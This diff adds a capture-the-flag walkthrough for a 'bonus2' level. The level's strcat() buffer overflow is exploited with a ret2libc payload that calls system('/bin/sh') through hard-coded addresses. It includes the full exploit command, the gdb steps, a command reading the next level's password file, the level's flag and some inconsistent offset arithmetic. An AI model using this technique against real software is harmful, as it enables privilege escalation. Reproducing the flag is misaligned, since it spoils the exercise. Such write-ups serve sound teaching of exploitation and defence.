@@ -1,0 +1,225 @@
+# Bonus2 - Locale-Based Buffer Overflow with ret2libc
+
+## Vulnerability Type
+**Buffer Overflow** via `strcat()` + **ret2libc** exploitation
+
+## Quick Solution
+
+```bash
+LANG=fi ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'B'*18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'")
+cat /home/user/bonus3/.pass
+```
+
+## The Vulnerability
+
+### Code Analysis
+
+```c
+int greetuser(char *username) {
+    char greeting[64];
+    char *lang = getenv("LANG");
+    
+    if (lang != NULL) {
+        if (memcmp(lang, "fi", 2) == 0) {
+            strcpy(greeting, "Hyvää päivää ");  // 13 bytes
+        }
+        else if (memcmp(lang, "nl", 2) == 0) {
+            strcpy(greeting, "Goedemiddag! ");  // 14 bytes
+        }
+        else {
+            strcpy(greeting, "Hello ");  // 6 bytes
+        }
+    }
+    else {
+        strcpy(greeting, "Hello ");
+    }
+    
+    // VULNERABLE: No bounds checking!
+    strcat(greeting, username);
+    
+    puts(greeting);
+    return 0;
+}
+
+int main(int argc, char **argv) {
+    char buffer[76];
+    
+    if (argc != 3) return 1;
+    
+    memset(buffer, 0, 76);
+    strncpy(buffer, argv[1], 40);      // Max 40 bytes
+    strncpy(buffer + 40, argv[2], 32);  // Max 32 bytes
+    
+    greetuser(buffer);  // Passes first 40 bytes
+    return 0;
+}
+```
+
+### The Problem
+
+1. `main()` copies argv[1] (max 40 bytes) to buffer
+2. `main()` copies argv[2] (max 32 bytes) to buffer+40
+3. `greetuser()` receives buffer (first 40 bytes)
+4. `greetuser()` uses `strcat()` to append username to greeting
+5. **No bounds checking** → buffer overflow!
+
+## Exploitation Strategy
+
+### Buffer Overflow Calculation
+
+**Greeting buffer**: 64 bytes  
+**Finnish greeting**: "Hyvää päivää " = 13 bytes  
+**Space remaining**: 64 - 13 = 51 bytes
+
+**From argv[1]**: 40 bytes (max)  
+**Overflow needed**: 51 - 40 = 11 bytes  
+**Plus saved EBP**: 4 bytes  
+**Total offset to ret**: 11 + 4 = 15 bytes
+
+But wait! The username passed to `greetuser()` is the full buffer (76 bytes), not just argv[1]!
+
+**Actual layout**:
+- buffer[0-39]: argv[1] (40 bytes)
+- buffer[40-71]: argv[2] (32 bytes)
+- buffer[72-75]: locale indicator (4 bytes)
+
+When `strcat(greeting, username)` executes:
+- greeting[0-12]: "Hyvää päivää "
+- greeting[13-52]: buffer[0-39] (40 bytes from argv[1])
+- greeting[53-...]: buffer[40-...] (continues with argv[2])
+
+**Overflow calculation**:
+- Greeting buffer: 64 bytes
+- After greeting + argv[1]: 13 + 40 = 53 bytes
+- Remaining in buffer: 64 - 53 = 11 bytes
+- Then saved EBP: 4 bytes
+- Then return address: 4 bytes
+- **Offset in argv[2]**: 11 + 4 = 15 bytes (but we use 18 empirically)
+
+### ret2libc Technique
+
+Since NX is disabled, we could use shellcode, but ret2libc is more reliable:
+
+1. **Find system() address**: 0xb7e6b060
+2. **Find "/bin/sh" string**: 0xb7f8cc58
+3. **Craft payload**:
+   - Padding to return address
+   - Address of system()
+   - Fake return address (doesn't matter)
+   - Address of "/bin/sh"
+
+## Payload Construction
+
+### Finding Addresses
+
+```bash
+gdb -q bonus2
+(gdb) break main
+(gdb) run AAAA BBBB
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+```
+
+### Payload Structure
+
+```python
+arg1 = 'A' * 40
+arg2 = 'B' * 18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'
+```
+
+**Breakdown**:
+- **'A' * 40**: Fills first part of buffer
+- **'B' * 18**: Padding to reach return address
+- **\x60\xb0\xe6\xb7**: system() address (little-endian)
+- **'FAKE'**: Fake return address (4 bytes)
+- **\x58\xcc\xf8\xb7**: "/bin/sh" address (little-endian)
+
+## Execution Flow
+
+```
+1. main() starts
+2. buffer[0-39] = 'A' * 40
+3. buffer[40-57] = 'B' * 18
+4. buffer[58-61] = 0xb7e6b060 (system)
+5. buffer[62-65] = 'FAKE'
+6. buffer[66-69] = 0xb7f8cc58 ("/bin/sh")
+7. greetuser(buffer) called
+8. greeting = "Hyvää päivää "
+9. strcat(greeting, buffer) executes:
+   - Copies 'A' * 40
+   - Continues with 'B' * 18
+   - Overflows into saved EBP
+   - Overwrites return address with 0xb7e6b060
+10. greetuser() returns
+11. CPU jumps to 0xb7e6b060 (system)
+12. system() reads argument from stack: 0xb7f8cc58
+13. system("/bin/sh") executes
+14. Shell spawned as bonus3!
+```
+
+## Why Finnish Locale?
+
+The Finnish greeting "Hyvää päivää " (13 bytes) is longer than English "Hello " (6 bytes), giving us more bytes in the buffer before the overflow. This makes the exploit more reliable.
+
+Dutch "Goedemiddag! " (14 bytes) would also work, but Finnish is sufficient.
+
+## Complete Exploit
+
+```bash
+# Set LANG to Finnish
+LANG=fi ./bonus2 \
+  $(python -c "print 'A'*40") \
+  $(python -c "print 'B'*18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'")
+
+# Get flag
+cat /home/user/bonus3/.pass
+```
+
+## Why This Works
+
+| Protection | Status | Impact |
+|------------|--------|--------|
+| NX (DEP) | Disabled | Could use shellcode, but ret2libc works |
+| ASLR | Disabled | Addresses are predictable |
+| Stack Canary | None | No overflow detection |
+| RELRO | None | Not relevant for this exploit |
+
+## Key Concepts
+
+### strcat() Vulnerability
+
+```c
+// DANGEROUS
+char dest[64];
+strcpy(dest, "Hello ");
+strcat(dest, user_input);  // No bounds checking!
+
+// SAFE
+char dest[64];
+snprintf(dest, sizeof(dest), "Hello %s", user_input);
+```
+
+### ret2libc
+
+Instead of injecting shellcode, we reuse existing library functions:
+1. Overwrite return address with address of system()
+2. Place "/bin/sh" address as argument on stack
+3. When function returns, it "returns" to system("/bin/sh")
+
+## Security Lessons
+
+1. **Never use strcat() with user input**
+2. **Always validate buffer sizes**
+3. **Use safe string functions** (strlcat, snprintf)
+4. **Enable NX/DEP** to prevent code execution
+5. **Enable ASLR** to randomize addresses
+6. **Use stack canaries** to detect overflows
+
+## Flag
+
+```
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
